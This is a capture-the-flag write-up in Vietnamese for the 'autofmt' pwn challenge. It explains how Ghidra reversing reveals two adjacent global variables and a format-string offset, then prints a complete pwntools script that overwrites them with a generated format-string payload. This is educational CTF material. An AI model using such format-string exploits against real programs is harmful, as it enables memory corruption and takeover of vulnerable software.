# autofmt
## Description
trung bình  
`nc 45.122.249.68 10015`  
[Attachment](https://cnsc.uit.edu.vn/ctf/files/8039b457e34e53cca8bdb45293ebcd7c/autofmt.zip?token=eyJ1c2VyX2lkIjoxMTczLCJ0ZWFtX2lkIjo1MDUsImZpbGVfaWQiOjE4OX0.Yck7ow.pQvirDeUUnBjbD5rzdr7hwF8Ddw)

## Solution
Khi chạy chương trình thì ta thấy rằng, chương trình sẽ in ra giá trị của `a`, `b`, và địa chỉ của `a`.  

![image](https://user-images.githubusercontent.com/44528004/147433337-ab035699-2094-4264-89bf-bfd798e9fefc.png)  

Sử dụng ghidra để reverse thì ta thấy rằng biến `a` và `b` là biến toàn cục và biến `a` nằm ở địa chỉ cao hơn biến `b` 8 bytes.  

![image](https://user-images.githubusercontent.com/44528004/147433429-9f0cb202-682c-4f3b-8ed9-5ea36cd4df42.png)

Đồng thời ta cũng tìm được offset của format string là `10`.  

![image](https://user-images.githubusercontent.com/44528004/147433711-90a8b646-e305-4923-88a3-7cbd1bd0b3df.png)

Với các thông tin trên, ta có thể sử dụng `pwnlib.fmtstr` để exploit như sau:
```python
from pwn import *
from pwnlib.fmtstr import *

p = process('./autofmt')
# p = remote('45.122.249.68', 10015)
elf = ELF('./autofmt')

p.recvline()
p.recvuntil(b'a = ')
a_value = int(p.recvline().strip().decode())
p.recvuntil(b'b = ')
b_value = int(p.recvline().strip().decode())
p.recvuntil(b'a address: ')
a_addr = int(p.recvline().strip().decode(), 16)
b_addr = a_addr - 8

context.bits = 64
writes = {a_addr: a_value, b_addr: b_value}

payload = fmtstr_payload(10, writes, write_size='short')
p.sendline(payload)
p.interactive()
```

Kết quả chạy local:  

![image](https://user-images.githubusercontent.com/44528004/147433827-6fcd0549-5177-436a-a5b8-503697bbe01e.png)

